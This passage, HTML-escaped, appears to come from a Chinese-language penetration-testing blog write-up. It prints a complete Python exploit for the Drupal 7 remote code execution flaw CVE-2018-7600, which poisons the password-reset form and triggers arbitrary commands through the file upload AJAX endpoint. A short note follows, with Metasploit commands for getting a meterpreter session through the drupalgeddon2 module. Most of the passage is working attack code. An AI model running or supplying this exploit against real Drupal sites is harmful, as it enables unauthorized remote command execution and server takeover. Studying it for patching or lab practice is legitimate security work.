class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import argparse&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from bs4 import BeautifulSoup&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def get_args():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  parser = argparse.ArgumentParser( prog=&amp;quot;drupa7-CVE-2018-7600.py&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    epilog= &amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    This script will exploit the (CVE-2018-7600) vulnerability in Drupal 7 &amp;lt;= 7.57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    by poisoning the recover password form (user/password) and triggering it with&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    the upload file via ajax (/file/ajax).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &amp;#x27;&amp;#x27;&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  parser.add_argument(&amp;quot;target&amp;quot;, help=&amp;quot;URL of target Drupal site (ex: http://target.com/)&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  parser.add_argument(&amp;quot;-c&amp;quot;, &amp;quot;--command&amp;quot;, default=&amp;quot;id&amp;quot;, help=&amp;quot;Command to execute (default = id)&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  parser.add_argument(&amp;quot;-f&amp;quot;, &amp;quot;--function&amp;quot;, default=&amp;quot;passthru&amp;quot;, help=&amp;quot;Function to use as attack vector (default = passthru)&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  parser.add_argument(&amp;quot;-p&amp;quot;, &amp;quot;--proxy&amp;quot;, default=&amp;quot;&amp;quot;, help=&amp;quot;Configure a proxy in the format http://127.0.0.1:8080/ (default = none)&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  args = parser.parse_args()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  return args&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def pwn_target(target, function, command, proxy):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  requests.packages.urllib3.disable_warnings()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  proxies = &amp;#123;&amp;#x27;http&amp;#x27;: proxy, &amp;#x27;https&amp;#x27;: proxy&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  print(&amp;#x27;[*] Poisoning a form and including it in cache.&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  get_params = &amp;#123;&amp;#x27;q&amp;#x27;:&amp;#x27;user/password&amp;#x27;, &amp;#x27;name[#post_render][]&amp;#x27;:function, &amp;#x27;name[#type]&amp;#x27;:&amp;#x27;markup&amp;#x27;, &amp;#x27;name[#markup]&amp;#x27;: command&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  post_params = &amp;#123;&amp;#x27;form_id&amp;#x27;:&amp;#x27;user_pass&amp;#x27;, &amp;#x27;_triggering_element_name&amp;#x27;:&amp;#x27;name&amp;#x27;, &amp;#x27;_triggering_element_value&amp;#x27;:&amp;#x27;&amp;#x27;, &amp;#x27;opz&amp;#x27;:&amp;#x27;E-mail new Password&amp;#x27;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  r = requests.post(target, params=get_params, data=post_params, verify=False, proxies=proxies)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  soup = BeautifulSoup(r.text, &amp;quot;html.parser&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  try:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    form = soup.find(&amp;#x27;form&amp;#x27;, &amp;#123;&amp;#x27;id&amp;#x27;: &amp;#x27;user-pass&amp;#x27;&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    form_build_id = form.find(&amp;#x27;input&amp;#x27;, &amp;#123;&amp;#x27;name&amp;#x27;: &amp;#x27;form_build_id&amp;#x27;&amp;#125;).get(&amp;#x27;value&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if form_build_id:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        print(&amp;#x27;[*] Poisoned form ID: &amp;#x27; + form_build_id)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        print(&amp;#x27;[*] Triggering exploit to execute: &amp;#x27; + command)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        get_params = &amp;#123;&amp;#x27;q&amp;#x27;:&amp;#x27;file/ajax/name/#value/&amp;#x27; + form_build_id&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        post_params = &amp;#123;&amp;#x27;form_build_id&amp;#x27;:form_build_id&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        r = requests.post(target, params=get_params, data=post_params, verify=False, proxies=proxies)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        parsed_result = r.text.split(&amp;#x27;[&amp;#123;&amp;quot;command&amp;quot;:&amp;quot;settings&amp;quot;&amp;#x27;)[0]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        print(parsed_result)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  except:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(&amp;quot;ERROR: Something went wrong.&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    raise&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def main():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  print ()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  print (&amp;#x27;=============================================================================&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  print (&amp;#x27;|          DRUPAL 7 &amp;lt;= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  print (&amp;#x27;|                              by pimps                                     |&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  print (&amp;#x27;=============================================================================\n&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  args = get_args() # get the cl args&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  pwn_target(args.target.strip(), args.function.strip(), args.command.strip(), args.proxy.strip())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if __name__ == &amp;#x27;__main__&amp;#x27;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  main()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;这里可以直接使用msf，可以成功获取到一个meterpreter&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;use exploit/multi/handler&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;search drupal&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exploit/unix/webapp/drupal_drupalgeddon2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set lport xxx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set lhost xxx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set rport xxx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set rhost xxx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

